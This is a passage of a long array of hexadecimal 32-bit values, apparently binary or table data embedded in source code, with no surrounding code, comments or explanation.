68cb4,0x080eda5b,0x6a9c5329,0x1081a317,0x8dd736b3,0xf7a41eb7,0x3c549b58,0x3457b48e,0x6c1c5a6f,0x2f61fe61,0xeb73109d,0x87fc23dd,0x8355c922,0xa47b3646,0x35613e54,0x42a0c571,0x169d8b3a,0x38d98aae,0xfdf1f542,0xa7917b11,0x8962db01,0x573a1670,0xa4f6a6ab,0x97b43d18,0x8474ef57,0x314d5f78,0xf6b7200a,0x37890c56,0xf794dc3e,0x231cea44,0x315003e5,0x8cd07bf5,0xb9720595,0xaf706fb8,0x32526c20,0x0b035906,0x0f82551e,0x718c5c71,0x92ff7528,0xf1656884,0x6be31670,0xe1825001,0x28c40782,0x398e204f,0xcfcf411e,0x03872aa7,0x68a0265d,0x7ddd11c1,0x60419a38,0x2eeef129,0xd43fa8ec,0xb6f33f79,0xca0446fe,0x12ef27ee,0x63d0ba7f,0x18f64ffa,0x7fed1327,0x7173bac5,0x77e909c9,0x9f7c4530,0xb3ccbfe4,0x1634568d,0xd49eb0d9,0x04d33913,0x7e0ad3bf,0xd2edf972,0x95ad019b,0xee6ec9d3,0x84f5e2b7,0xbcb1476e,0x3cd050b8,0xb426d206,0xf360efc5,0x95e342a0,0xd387002d,0x1553a20e,0x0708aa89,0x2ccb74f4,0xf382a2ea,0xa29216d4,0xc4ca2974,0x285aca78,0x2b2d1bf9,0x5f4b67fa,0x24e624c4,0x69c2a8f3,0x6ac55f02,0x6178b61a,0xdcf9ee23,0x43a17b0b,0x3d0ac6bd,0x1f1e3f2e,0xaf8288ee,0x24245738,0x809c71b1,0xeb2c23d4,0xfa707945,0x03872aa7,0x68a0265d,0x7ddd11c1,0x60419a38,0x2eeef129,0xd43fa8ec,0xb6f33f79,0xca0446fe,0x12ef27ee,0x63d0ba7f,0x18f64ffa,0x7fed1327,0x8d3c809c,0xc52029fc,0x892df483,0xd317d354,0x228ebcf1,0x25284f9f,0x0ca75cd2,0x7c65caf4,0xff74aa07,0x8ecd1f1d,0xa3f1168f,0x4a133850,0x378e646b,0xdba70d8a,0xaec11ce4,0xdc53f272,0x34f3c209,0x8d734ca7,0xec1a289f,0x236e4d1a,0xda594413,0xe7e558b0,0x8b6ad369,0x701ffd88,0x1341d0ad,0x9dc28799,0x0c0e5839,0xf84e455a,0xe613cd21,0xf1d6ab68,0x031bb46d,0x7a00fc06,0x665c868f,0x4ecd7841,0xe01f213b,0x6f0b6bd6,0x260b9a66,0xf1879e0c,0xea84659d,0x7f9b943e,0x89588900,0x2d083708,0xbf2df7de,0x459fa54b,0x873001a3,0x901c2c20,0x2dbefcb0,0x4faea845,0x997fbc49,0x9ee2eddf,0x88628334,0xb314d339,0x2add5c39,0x4d55a2e0,0x92e6b8ea,0xe132cad9,0x2ba2fa95,0xdcd01385,0x9cdfe5f2,0x081ebecd,0x3cfab8b2,0x926e2cbd,0x3c3a12e4,0x492fc33a,0x46bd4fbd,0x37df1e4d,0x70545c17,0xe4114ec6,0x679b7d8e,0x3707d792,0x0ab3ce19,0x4277d98e,0x6df5d994,0xa8e33d40,0xf0882640,0x0c5edb08,0x82d827b2,0x7ed895fd,0xad315b9d,0x6d31e221,0x06175ba7,0x55ba2e58,0xa963769a,0xbdc6a97e,0xcb7cc80d,0xb3f388ad,0xda12369c,0xeb073829,0x82640ffc,0x0e50ef24,0xf373972c,0xf91d3171,0x2514c959,0x88148f0f,0x46e93998,0x70e1fc7b,0xbfefdec1,0x99339d58,0xfa513f3d,0x5d00121a,0x8bdd5da2,0x308ba9a9,0x2afa7075,0xb7301f03,0xc05e7822,0x4300adca,0xc2c42b27,0xa70ba5ef,0xbaa679fc,0x84e4aab8,0xa0d00ce8,0x0d48ba19,0xf2fcb14f,0x326698cc,0xb6195efb,0x1a45a19a,0x7dab8adc,0x064813b2,0x2e654bcd,0x974d3049,0xee78a35d,0x91fb905f,0x785e50ba,0xc8cd42d2,0x55a7630e,0xecad1f61,0x33f3f786,0xa9f492a5,0xb5b055bc,0xcfbe3d53,0x2e784eb2,0x9ee5433a,0x9fe2d988,0xecc18224,0x1eed381d,0x1d0e4365,0xb0de0254,0xab00ed46,0xe8459a85,0xaf6f0f4d,0x994f0bbf,0x0f6daddd,0x0922775d,0x4993f2c1,0x44cd237c,0x1f82c33d,0x855c6ac6,0xf919f10a,0x7cb63437,0xa0912305,0x91323b9f,0xf3f60b30,0x24f662ae,0x7f3d9953,0xa5da727a,0x6515e238,0x938c4b2b,0xe75a79fa,0xd1189fe5,0x57054275,0x79c0a67e,0xe4e05145,0xb0388886,0x52112b66,0x04078aa3,0x133102fd,0x9216e237,0x03a737d2,0x302b4e56,0xec2b224a,0x21fbe78d,0x10bdf897,0xaa09418b,0x6ebc2478,0x255bf8ba,0x3c4faf75,0x5d6dacf4,0x1e082023,0x47f1db32,0xd6dc0f56,0x14c79330,0x3c5d1aad,0x888650d7,0x5e5e7895,0x28b08852,0x200856c3,0x8c8c25e4,0x3452c9c6,0x6e544995,0xd752aeea,0x888ee073,0x0ad546f9,0xe515c914,0x4f0d39f7,0x7fe18ef4,0x6f9cd8e5,0xdb5d6ad3,0x1b706d8b,0x2f8b5fea,0x9e70ddb7,0x03872aa7,0x68a0265d,0x7ddd11c1,0x60419a38,0x2eeef129,0xd43fa8ec,0xb6f33f79,0xca0446fe,0x12ef27ee,0x63d0ba7f,0x18f64ffa,0x7fed1327,0x7173bac5,0x77e909c9,0x9f7c4530,0xb3ccbfe4,0x3ab96905,0x832a1409,0xd4d761d8,0x01ffc7ad,0x9b698c7a,0x7e01831d,0x40c18d29,0xb80fa103,0x15261b1b,0x507a5d23,0xd64af4f9,0xa97de972,0x0f9fb6bf,0x2c2e7c0a,0x628b2048,0xee024656,0xee55cd09,0x89af1682,0x64c15097,0x2dc36ee7,0xdb248675,0xc42e3e20,0x016f2f13,0x34363f38,0xa41e1817,0x231bed17,0x2654b718,0xb44c1323,0xd3b5b460,0xbd9a84cd,0x5836f2cb,0xdea62949,0xe5085453,0x5a2d7007,0xc142fdcb,0x0a31a642,0x4dbef20b,0x9df7a152,0x8a90dcd0,0x0eceb785,0xe7599ff2,0x82ea6c5d,0x84bf9d06,0x83de0708,0xccc29720,0xf542b564,0xff0b75fe,0x2e9647a1,0xb8e8adef,0x051fdfea,0x4d69481c,0x3745530c,0x778f5a72,0x5fed8ab7,0xe7566d1f,0xc6e8aeed,0x8473aba7,0x32021b93,0xb9bb745f,0x8a7a0eb1,0xfefd1d21,0x71ef5c22,0x2544a445,0x4e35b7fe,0x8693c9fe,0xb3db2cc6,0x4b21bce3,0x0a5de75d,0x548c22af,0xf549ceb5,0x1e5cb1fe,0xebf365d3,0x14ff3b6e,0xb318e3a7,0xcb390604,0xf9f31eba,0x23084ec8,0x4921b200,0x6e88165f,0xeaacb97c,0xb5519b26,0xb31e0c54,0xed8d7635,0x442b1017,0xb7666fb9,0x416681ac,0x0a6003f4,0x73d5c937,0xc0538a7f,0x95774676,0x696ed050,0x1d02f8d9,0x2c8b8f80,0xd399d114,0x94c9a7ed,0xb1d47300,0xe452902f,0xf6ade891,0xd34a1a12,0xca257c32,0x8a2382bf,0xa973b9f3,0x8eaaf837,0x439e4ced,0x54a0b84e,0xeee8a132,0x46f7c595,0xe8379182,0x04669879,0x071cb7ff,0x3edf7311,0xbc55121e,0xb410ae3d,0x5fe8040a,0xbe7592aa,0x0862f028,0xb041adce,0x7d71a5d9,0x88e7fa78,0x8105a113,0x2a2f38cb,0xac4d2ec5,0xb8340ed4,0xdc6cc254,0x221b2469,0x1f26ebe6,0x228c358d,0x657aa24d,0x931de595,0x3bf0148c,0xada1d8ce,0xf46d3e29,0x7ef69809,0x74164733,0xc398b890,0x35de138c,0x9278242e,0xb4144666,0xab9cdcb2,0xd41634a4,0x0e56de2f,0x40780d2a,0x4bcd30b9,0x3d434cf0,0x44c38752,0x838c4ff3,0xffd4fd7b,0x32eed150,0xb863aeb8,0x38e23c46,0x5b4f6e42,0xf536729e,0x7580a580,0x00dd4322,0x768cc611,0x15efd826,0x8c7debe2,0xe80cca7f,0x92f81b45,0x81380421,0x719b4f73,0xc4e2689b,0xa8f98f86,0xab91aad0,0xb1e81e12,0xd03d7035,0x63d031b9,0xdd98e3f3,0x0f93dcac,0xfb38a93a,0x836aa1df,0xc209b927,0x2a844a19,0xf33bad6b,0xbabbba88,0xb39bfc34,0x953aff81,0x2ee7f033,0x9dc3d2cd,0xcb958406,0x7ec093f0,0x293981a1,0x988a4486,0x304ad24c,0xa9b09a53,0x08229404,0xad01bf92,0xae9ed6ee,0x8e0db980,0x37660dc7,0xaaf84a2c,0x1187ef6d,0xebbe8b96,0x3af71b76,0x699d5ddb,0xec928d0b,0x256970e6,0x596618e1,0x4b52a5cb,0x5593c0b8,0x4dee9f10,0x280b589b,0x1d5f97e3,0xc7efb3a6,0x6e67bbf0,0xad728a26,0xa18e7850,0x731991bd,0xa1f658a2,0xaf3b003a,0xad653b01,0xf95e2002,0x0ecf42cc,0x2cde63e5,0x88b6bb9d,0x75c63503,0x1701f718,0x735238ca,0x1caf8db3,0x402ed473,0x9fb898f6,0xf701c5eb,0x4987d648,0xb211ab8e,0x620372e2,0x2d6f895d,0x43538602,0xb636fa93,0x3c8e562b,0x6f75cf22,0x8cbb3ed7,0xee8c4be6,0xf597fe9c,0x20b0f752,0xebe585a8,0xd9073c09,0xd68fc925,0xb2faac7b,0x2513926e,0x21ebc6a4,0x3e77d275,0x3a62ac93,0x6803293f,0x90ae6771,0xad9e34c7,0xeed63d9f,0x56341d59,0xcb56ee02,0x2aedd671,0x4c4cdca5,0x0abb689e,0xdcc053fc,0x9c584707,0xcd1fc6c1,0xa024278e,0xed4e1abd,0xa40fe140,0x403686a7,0xeb645fe8,0xa5cd1c50,0x1554add2,0x50b716e5,0x9d7d580c,0x9e32bc9a,0xc6b1fb13,0x2083d037,0x71cf60b4,0x25aca2d5,0xf147fe12,0x8d3cbbb3,0xafd501b3,0xc74ebe18,0x0f3e2f6e,0x7d24f4a1,0x32222e45,0x565cb2ae,0x35e0443c,0xc4afc445,0xdf78006b,0xc9093233,0xeb322dfe,0x22404908,0xaba92c58,0x0b76c08b,0xb311859d,0xde19cb2f,0x67fa6d7a,0x784c1112,0x947c07a4,0x392e2af8,0xe414d816,0x12700ddb,0x66d8c5d7,0x9805907d,0xfedeea61,0xf2e730d3,0xc35bdcbf,0x4a0f12b2,0x4055ae9f,0xffa1b524,0xbb000e1f,0x0be973a4,0x4cbee57f,0xbe401629,0x20a87bdc,0xfcaaf659,0x6a9f95d7,0xed119afe,0x9742f772,0x17992d30,0x042c07fe,0xbceb8bcf,0x75357714,0xae52d4f0,0xe9188b02,0x02ef8d97,0x36ec3f4e,0x78895536,0x25750c34,0xf6abe72b,0xe4aa0eb1,0xee508ff6,0xf1d86a49,0x96dc0c4b,0xbac764db,0x4784d99d,0x030287f8,0x95579955,0xf61ee75d,0x148254a5,0xd4f27a54,0xb3ffb9e1,0x6d69bd7e,0x06f26257,0xac1460ac,0x8a4d1e24,0x6db43aaf,0x0848a568,0x4ebee51c,0xb8e541b7,0x4b27dfec,0xa109f074,0xeb6b2813,0x733bc5fc,0x347f07e8,0xe8c36292,0x7185fc00,0xcb204b75,0x849bb7e5,0x4aaf3c83,0x0befcb9a,0xfe010d62,0x7395e427,0x1273d0e2,0xb50ac91b,0xdb7082e3,0xf69c5605,0xab942a65,0x8430824d,0xc0390c3b,0xd2e5a768,0x2c37bd7f,0x892cee6c,0x39881c02,0xfc94601d,0xbbe0d986,0xa6801f38,0x153b0775,0x44286538,0x0d7c6c16,0xb206b9eb,0x2a4db15e,0xdeb99db0,0x073eb5ed,0xb56ed24e,0x417c59d7,0x23bf939b,0x0a3364f0,0x9d8d54bc,0xd9ad4fb9,0xe78aedec,0xcbda264e,0x61810dd2,0xaaac9cee,0x6851b6c2,0x1b2e5415,0x90731a3b,0x30d1b538,0xce0dc94b,0x3fc67e44,0xdb37b2c0,0x677806a3,0xea2e7db4,0xbe3d8860,0xcd2e9dca,0xd287bf57,0x54ba1b57,0x74ee8c37,0x0c060abc,0x53bf9515,0x31493b28,0x5543be77,0x5997c962,0x856d4010,0x7175554e,0xaefd3fc7,0x466cea52,0x33096103,0x545f8995,0xee7bfcc9,0x7ec5f1ea,0xf323ce04,0x555f5709,0x326f02e4,0xc5ca676f,0x2d5f085a,0xf683fc77,0x65bf3e94,0x920aa306,0x45c8eb30,0xaababd35,0x93e8581d,0xa4a77445,0xce34335a,0x478056e6,0xc7efb39a,0xe89c6957,0x048f6907,0x7173bac5,0x77e909c9,0x9f7c4530,0xb3ccbfe4,0x1867b6d2,0xc327ef9d,0x47f9123b,0x8544399e,0x4791f1b8,0xc56cab56,0x559734bc,0xb04af23a,0xf62d9fe2,0x18e3c72b,0xdfd6c39f,0x1f964bbd,0xc241d665,0xaaebca5e,0xd9ae95e1,0x97a5e685,0xb5e81860,0x74d7f58d,0x5de07a21,0x64a42310,0x6477e0f7,0x2ef23ee5,0x2a4e3549,0x6d6c0675,0x587a6bf7,0x46e58bfb,0x10177208,0x8358e541,0xe2eae106,0x4bdcacae,0x75bc46f0,0xe29c0288,0xe5f28c16,0xa196e0c6,0xdd5c4a62,0x0906157b,0xd35b949b,0xfbc4ddcd,0x74c6914e,0xace3821b,0x25ce3f73,0xa5093051,0xc458118f,0xaac859d5,0x95f00f81,0x036ade87,0x797435ad,0xa9308a35,0xff92d0c1,0x282eeda3,0xc7f017b2,0x1ce7b07a,0x2c3cb0c6,0xec0a4f7d,0x0bf7ea52,0xe2aa970e,0x7c1a0424,0x66f639ad,0x5c56ab7b,0x2145c062,0xc8581870,0x77d0192f,0x5d43c9d6,0x290dbf15,0x9681541e,0x4b144bc8,0x0a002688,0x4dee3a17,0xac71034f,0x394d44f6,0xe8af961a,0x204f4add,0x83956747,0xaf0c9dd1,0xa460dae9,0x6f8f4b8b,0x48046d0f,0x01804e5c,0xb50397eb,0x4291a8e3,0x19cfdf1e,0x053ed853,0xfdec494d,0x746f371b,0x801ce27d,0x5682b0be,0x8e87e14c,0xa7bd947d,0x7990304c,0x0960df7d,0x13f789c9,0xa42f5700,0x4d36a928,0xdb805cdd,0xcbdcc7c4,0x5edb5deb,0x4ab77359,0xc091aaa5,0x92f11990,0xec416509,0x8efe5ea5,0x6c10df69,0xece3a92d,0xc85e0b3b,0xe3493cd2,0x86cc3252,0x45f89515,0x43d30f58,0xce78ca4b,0x1ee4cc6d,0x902c1952,0x41166097,0x793630ef,0x384e51c0,0x5064db83,0x03f3856f,0x9b6b3ae8,0xcc4788f5,0x6b74998c,0x85620458,0x6fb09052,0x19ace8f2,0x1258be92,0x590637bf,0xe0c919b1,0x001ee529,0xc963f4ef,0xf8b99a1f,0xe2fc8c6e,0xefe96747,0x99d81570,0xb039002d,0x6874ff4c,0x4c9394f3,0x1d02ff07,0x51214198,0x229d90ee,0x77d52bcd,0x6f1e5bac,0x0e02ff37,0xe0cd9f1f,0x943e58e4,0x41611128,0xf3cd3c29,0xbfef3090,0xe246a3a3,0xf1e74768,0xe5e1e63c,0x88013d33,0xeeb49df5,0x4cd1fc8b,0x7dc75dbf,0x7b8f0ca7,0x613d1a17,0x1fee5bc0,0x36886b38,0x93c23b6e,0x5e41d58f,0xd4d6732e,0xf4ad0fe6,0xf074ba11,0x22ae60af,0x19ffc45d,0x66422eb0,0x64fc6fe9,0x293f5ba0,0x8b60c53d,0x9569848c,0xb16fdfd9,0xf57e73cb,0x990236b2,0x73f82181,0xc74eeaa8,0xb4158225,0xedb1ae4d,0x5cca22f0,0x9e5e39d1,0x7256c70b,0x325eb85d,0x2d5c22f1,0x86f3bdc5,0xd44a7600,0x680f7957,0x89ad6aa7,0x87cf287b,0x3a714b7e,0x3d4ed16f,0x3d773b0f,0xebcfc781,0xc047f502,0xd1ddb435,0xc7d1e7ed,0x9727c39c,0x24861e52,0x36e1ea7e,0x960a0b12,0xcd35432e,0x7b398abc,0x4674f339,0xa093f3b2,0x7e264173,0x4294fa96,0xe2445a7f,0x3f7d4412,0xc3a73d3c,0x393170c9,0x69903fec,0x7ae7e137,0xc7aaa3e1,0x60a0f240,0xc07d10b1,0x490e614d,0x0583fc17,0x023a8493,0x52957853,0xdfda2fbc,0xf2bf5fc2,0x99cc1bfe,0x5e9c1ecb,0xc23cb1fd,0x89242623,0xf702d517,0xf2078da6,0x02883b41,0x6229be6f,0xc6167703,0xb5f5a535,0xd30eab8d,0x10d6ebde,0x00badd19,0xa5882218,0x1de5cd73,0xf5ce0134,0xe9f1351c,0x8238aef2,0xbc9562e7,0x72231c3e,0x6e148dbb,0x35dcd70b,0xf55ea483,0xe19ae249,0xe1305260,0x398d1bf9,0x3c8ae128,0xd06aa9e8,0x37822988,0xec13ce19,0x14f60e6e,0x271351e9,0x1cde2c18,0x826856e1,0x623bbbe8,0x6276bb42,0x28a8fbd9,0x9e412c04,0x943c280d,0xee05dea0,0xd1815c18,0x6096f75e,0xdd93f8eb,0x2a39feb4,0xca3a96b3,0x93616546,0xa4bb210d,0xe99b749d,0xea9c10ab,0x154fd8d3,0xf91a5c7d,0x5656316e,0xd8235747,0xa0ea1e7e,0xb0e60507,0x2787b96e,0xa5b99880,0xcf24a995,0x3ef7f16a,0x2314187b,0x21191a45,0x2e0d494d,0xf62a93b6,0x2a7705ec,0x389d60bc,0x67d6b230,0x0ba44e24,0x054b15b5,0x17cf1cfc,0xc49f841d,0x0df7d4e9,0xdc6a5aaa,0x9a1aac6f,0x5bceafcd,0x62371ae0,0xc54067db,0xe667e70b,0xea0be7e9,0xeb403cd3,0x638141fa,0x257741a9,0x910ab45b,0xdb4a0ac1,0x3d6e2867,0x03e8636f,0xc3bba90e,0x9c0987cc,0xeab03100,0x7952db5a,0x32d31c39,0x98abd829,0xdab3341f,0xb62af117,0xf98bdd43,0xea35672f,0xb7e5ac3f,0xce2fd585,0xb77b12cb,0xafe28e25,0x8f796b71,0xa16421a5,0x18870e01,0xda4f1557,0x40c24897,0x4f3ce2ac,0xb9660400,0x2c729821,0x11ad47f7,0x8873d9e3,0x8d4d882c,0x3cba3e6b,0xa1fb8669,0xc5ba552a,0x13b3135a,0xa392b0bd,0x0319d8d0,0xb0bbcede,0x4ed759e1,0xc0905e3b,0x7f945eef,0x609b992b,0xd5cf8b5a,0xdff03518,0xf82750eb,0x44c756b4,0x6c55b751,0x8dd7db02,0x1127ac15,0xa87256a4,0x621ab40e,0x77bffa45,0xb9e599b4,0x4d27bcd2,0x42896794,0x3da19223,0xc82e1085,0x99235c58,0x60008410,0x7e32777e,0xbec6a4f9,0x148eece9,0x9f780820,0xda9ed428,0x476a1739,0x43627dbe,0x79a7bc3a,0xd5a81f1b,0x3d8fe57c,0x10ca8b73,0xce397f65,0x30347f8e,0x752b3279,0x30562042,0xf39268fa,0x046a65d7,0x495d465c,0x3f72505a,0xf07e4fcc,0x248ef326,0x15c8631d,0x5798544b,0xb8c26b62,0xdf8a992b,0x3206d37a,0x27922928,0x68ef423b,0x7330bb4c,0x089a7e6f,0x85addc31,0xbcefc522,0xedaf6200,0x8bc2a916,0x9a954cec,0x798594d3,0x23e587f6,0x4c7e632a,0x3b02b6e3,0x2390362a,0xada3bf51,0x6f21d123,0xa56f6180,0x6264aa95,0xd2a2e497,0xe7294480,0x3b4bed91,0x7d2584f1,0xe65eb502,0xc188a128,0x803ed15f,0x2c7848a4,0x6e8c1bdf,0x5556470d,0x0657ac04,0xb7d29657,0x1d89f654,0x99c2ad89,0x8709a1e5,0xc3ddb5a2,0x58ca5e39,0x89a03594,0xf2039d17,0x16a14e04,0x9b1c8682,0xab6785b5,0xc1fcd026,0x488de7f9,0x0e836b2a,0x865ba682,0x5d0fbf99,0xf9742f4a,0x6a938e5b,0xf1d58c05,0x5aa33fcf,0x1dfb2cf4,0x786a1fde,0xfd6ecf0c,0x173edee4,0x0cf9e11e,0x0948eed2,0x9cdbf5b6,0x102d36ed,0xd0c3223a,0x8cd5e9d9,0x59aab85a,0xdbafa4ad,0x97426e57,0x04599cf5,0xab2882b5,0x2f55f8a7,0x1b33e099,0x57de877c,0xca381c5f,0x81a86e80,0x9ed47e8f,0xa8cb64a6,0xecd6ee5b,0xd0e290cc,0x9bc67aec,0xd2fe4bd0,0x6f51e83a,0xcb9e64c7,0xfea53aa0,0x0782e261,0xa33835f1,0xe50c6a89,0x7f6466ef,0x51fddbc4,0xe1f92bf9,0x9c2342df,0xd07f3d92,0x39b0f1cf,0x4cd336c5,0xaa99e17e,0xac3ada3d,0xca9a8c43,0x16ce4336,0xfd14ab00,0x81a5e81a,0xb61eae14,0x6df844d4,0xae370abc,0x402462a4,0xafd0c19f,0xc18c9849,0x5247b589,0x5ff8eb70,0x719148cf,0xea0138e8,0x67877484,0x6098f8bf,0xc06bdc35,0x9f362b35,0x601ad467,0xe483a693,0x580c6095,0x9bba5893,0xd2355c92,0x025017c5,0x7b2290a8,0xcd8d732e,0x57a66e00,0x7021869c,0xc9a3dac1,0x4ba50ec7,0x992d4cfd,0x1e4c1013,0xae62b32e,0x043becc6,0x0ba36e55,0x591e56a3,0x575963ac,0x20bfee2c,0x5ec594d9,0xf6311231,0xe177c10c,0x9e3bf9a3,0xbe5a9077,0xacc3f86c,0x8dc31762,0xfdcfedc8,0x59d41318,0xdcbc005c,0xc3ccfd9d,0xdb9f94de,0x423ff0a8,0x4a689451,0x11b613bd,0x4b60e96a,0x01de7067,0x6aa0d0ad,0xf09c4143,0xbc6e20c5,0xdb0e9339,0xef0ab32b,0x0fe43f0a,0xbedf1658,0x0e4a3e5c,0x2b3bafab,0x772f2f88,0xd32a7bf8,0xee27f971,0xde8323c1,0x56729b24,0x3f143730,0x98183df1,0x580b786f,0x70022206,0xfe4e92e1,0x63c809f5,0xe10a76dd,0x735b35dc,0xa6eaa949,0x3b877921,0x3bb98b93,0x2fb0e5a3,0x28dd2b6d,0xd9db2459,0x381bfd06,0x1d71c6dc,0x31a56f90,0x18315b1f,0x10d02102,0x2c1503c2,0x57b612cc,0x5679bde5,0x982d5c92,0xd96217b9,0x466461c4,0x315fa791,0x8265faf0,0x75867a29,0xc48e6157,0x4da70c8b,0xd6fae13d,0x07c462f5,0xa262939b,0x1633d288,0x3b71e35c,0xe0f9f6c8,0x83b985fa,0x74b9d675,0x3599756e,0x69bcda5d,0xdd5a8364,0x932ccede,0x6bfb7e65,0x9b6fe7c0,0x067f1d91,0xa2c12b18,0x1aff1a7c,0x57463575,0xd2edf972,0x95ad019b,0xee6ec9d3,0x84f5e2b7,0xbcb1476e,0x3cd050b8,0xb426d206,0xf360efc5,0x6080d00b,0xba1c226d,0x6a9f33a0,0xd944963a,0x9a37f13f,0xc63cfd51,0xc90701a6,0x510ecb5f,0xae400d07,0xd70f7867,0x1e228440,0x16072d9e,0x86a44bec,0x937f0578,0x9537c561,0x7cada3fd,0x64a9651d,0xeebc0ee6,0x48036e4b,0xf3031114,0x649d0f99,0xd807eb82,0xbca6abd3,0x09871329,0xc4b89fa8,0xe869986e,0xf8d3d4fe,0xfe93fbf0,0x85ac2b8f,0x0385e752,0x112f62d8,0xb78e14ec,0x5a0e5a05,0x3292edca,0x8ed5a61e,0x6759583f,0x14e110fe,0x6cc1859c,0x1ac73e3c,0x80519acc,0xd86495e8,0x83d43e25,0xf10d99c7,0xa5cb0100,0x977d52ba,0x451e5a07,0x69b82497,0xb4325b14,0xa1f35c3e,0xafeafc02,0xa6d69453,0x29149ac4,0xeefaae85,0x115f0a03,0xbd74ed6f,0xb88f4851,0xc70881bb,0x6c949435,0xc7e2f9c9,0x076535eb,0x866cadcb,0xef6783a8,0x4903dc86,0x519ac662,0x30e6827e,0xf92f57ce,0xda56368d,0x5ec65ad2,0x851b1863,0xd54558b0,0xe2321d8d,0x833a4aa6,0x1f94af7a,0x2341f0a8,0x7369bd63,0x5251beab,0x82f60069,0x311aebd1,0x7e02c032,0xc4be86b5,0xef251ad1,0xc5c556a9,0x7697116f,0x6d6637f7,0x28e25fc0,0xa9b0da3e,0x4e5eef53,0x1d2542c6,0xcefa3df4,0x1451cb5a,0x1a123459,0xb379476f,0xd931b047,0x6d1d9c91,0x215b28e2,0x5d3642c0,0xd69475fc,0xc79b574d,0xf8c80eb9,0xed612882,0x78610b71,0x95f70b56,0xeb53fe7d,0x5ce0fa40,0x0f1d5399,0x628bcddb,0xaadab13b,0x1c9d6c36,0xa7f23914,0x4c2511f1,0xc5e51b8c,0x438f06d2,0x2e2112a3,0x54a3f36b,0x8f222f4d,0xb52062f8,0x0c84b4aa,0x96f1acc5,0xbe1a0171,0x5e492971,0xfe409269,0x6e8cf0af,0xf7a0ca8d,0x8f7645c4,0xb08cdf97,0xc22b1668,0x5561d91c,0xab512236,0x1f32cfe6,0x1d88131d,0x9ae8e6f3,0xd866d450,0x6c3ff1dd,0xa0451dbe,0x4f2e2148,0x53808ce3,0xce150396,0x571f7049,0x4e4bb2b9,0x51eb30c8,0x86856df0,0x9858a004,0x515972f4,0xbd94ffbd,0xb2c85876,0xca593229,0xbd7ba9bd,0xba3747b7,0x0ea4599d,0xdb69b9c7,0xfef2c4c9,0xef25e957,0x01cf6763,0x99721c3e,0x38e982b7,0x0cbd41ef,0x672869ea,0x69814dfb,0xcd04e57f,0xe1213ce1,0xf35edfff,0x782d5728,0xb3774c7a,0xaeffca69,0x2f54488a,0x167ea73b,0xba10b44d,0xa9f544d7,0x54dc32ab,0x5b34fe92,0x7bc6101d,0xd8aa8ea2,0x67da60a0,0x18432fc2,0xd6958e28,0xe0cdafaa,0x9d025365,0xb480247e,0x45f79eb6,0xcea8c49f,0xc7a8682a,0xab73ca37,0x0a091707,0x297c6008,0x254e3b1e,0x7848cca6,0x7805410c,0x5ea7537d,0xf1e374a0,0x81747751,0x74966f59,0xde758c6d,0x768411c6,0xc8686a98,0xfd9376b7,0x59c10611,0x3a6ac316,0xd434a337,0xc20599b9,0xb417a099,0x50c734e9,0xb92ecfa5,0x4d77eecd,0x03074bf6,0x8afedf64,0x86505af9,0x18325908,0x83f94fd5,0xe946522d,0x163928ce,0xc7c800dc,0x3ebadfba,0xdd8ca32d,0x70dc9021,0x4f11805f,0x241860ec,0xb3180d16,0xbc178e2d,0x2c9ce694,0xb38c240a,0x3fd75971,0x07a39ff8,0x6b06d6a5,0x16dbc323,0xa88e26be,0xb4623f9f,0xce6b12fc,0xa8c47dc6,0x1ccdc7a6,0x97786de3,0x4c89d9c8,0xe10f2a8f,0xb16fdfd9,0xf57e73cb,0x990236b2,0x73f82181,0x86f3bdc5,0xd44a7600,0x680f7957,0x89ad6aa7,0xa606430b,0xf66d9a1a,0x86b3e2b1,0xea77a73a,0xa0b17537,0x937828e4,0xd502e554,0x034f9ce9,0xcb7a2595,0x547a79c5,0x51828232,0x1d529e96,0xa4e39f19,0x519dc0dc,0x20f1b30e,0x06b72cde,0xddef088c,0x1123d5a0,0x6fbe1cb9,0x9147a9bb,0x02720dc1,0xbdc51674,0x6af3b364,0x5e2851e4,0xb3687167,0x4470beda,0x880fe136,0x30edf347,0x024b78c9,0xcd934c3e,0xafd4e4ae,0xd4e0ad8d,0x04f7d78e,0x55560a15,0x74733859,0xc027fd4c,0x7e9cb469,0xe5b99c5e,0xc0a9e055,0xd146f806,0x2cfe2959,0x1c8e0f78,0x194dd8e1,0xcc052456,0xde28f535,0x1d23a395,0x9c08a096,0xe792da2a,0xfe547861,0x2a6ec8fe,0x3cd1187e,0x3a9c8b9b,0xa3040d73,0xda266b75,0x9a59e570,0x736ea150,0x3e4d6803,0xa7b30bd9,0x43abb778,0xeca39be6,0xf7774c80,0xd6309a60,0x4024c63c,0x3f8edff9,0x274d012d,0x1d320783,0xd1409396,0x55ad7943,0x99a084ab,0xdab5ed7b,0x6c5aef91,0x70bacbbe,0x44ac765f,0x863ed342,0x1f43521e,0x605ffe40,0xd993d2f3,0xdf1efde1,0x72380bfa,0x931f9a65,0x7b000b44,0x9f747bb0,0x394f1707,0x437dbefb,0xc450d8b2,0xf9693d8b,0x005008b5,0x5666ce4c,0xbe5b0ec0,0xbf52097d,0xe2b52545,0x941680f7,0x97394c97,0xcc5b33bb,0x51a1a25e,0xa606c6c8,0x89bde0af,0xd9d901ce,0x883253aa,0xedb7ba90,0x54b80263,0xbebb72e3,0x472982ae,0xee2c3aa3,0x1c21105f,0x1f29fa3e,0x8b42a82f,0xd9b41328,0xb63a5fa2,0x79607b1d,0x7a2ae0ef,0x284c7773,0xe8de5a87,0xaca95ce7,0xbadb5e0a,0x5680319a,0xa4f0008e,0x8328d2ec,0xfde5e6eb,0x6c7ff375,0x0f42d29d,0xc1c6f069,0x9eac2f07,0xf3f05cd8,0x3ad2ece2,0xc0644c27,0xfa582690,0x0d28c5f8,0x8b1a3fa7,0x83eb25a5,0x4cf537d7,0x5c93ff3d,0x3ada4a5e,0xfb61dd30,0xd1a053b8,0xfc5929a6,0x2227b6f1,0xae962f1a,0x86ba777c,0x78322354,0x9539fb51,0x44265bcb,0xfa14e0e8,0xcf782d63,0x38366e5c,0x4b326329,0x5b3ae9d4,0x70441c48,0x901acefa,0x51fed539,0xa19876f5,0x7dd640b6,0x1cfee701,0xb1420c60,0x1f4db030,0xe8309c56,0x06b129ab,0xc12f7874,0xfa28c7b8,0xdd86e576,0xa1cbe6de,0x20009828,0xc4079f42,0xe30a7b6d,0xeb6d8ca6,0x24436cd9,0x5ce07b49,0x292830c6,0xc68d56bf,0xf92cd66c,0x78f2f316,0xb0a308ce,0xcea4b8f9,0x13ed2191,0xb33d5d59,0x983076ea,0x57e43ced,0xf7912b59,0x0b0ad2c1,0x361a101e,0xde3bd52e,0x3c5963b3,0x8370f033,0xc12114ee,0xd8a208d4,0x98305d5b,0xa427f705,0x6663afb4,0x2a7d8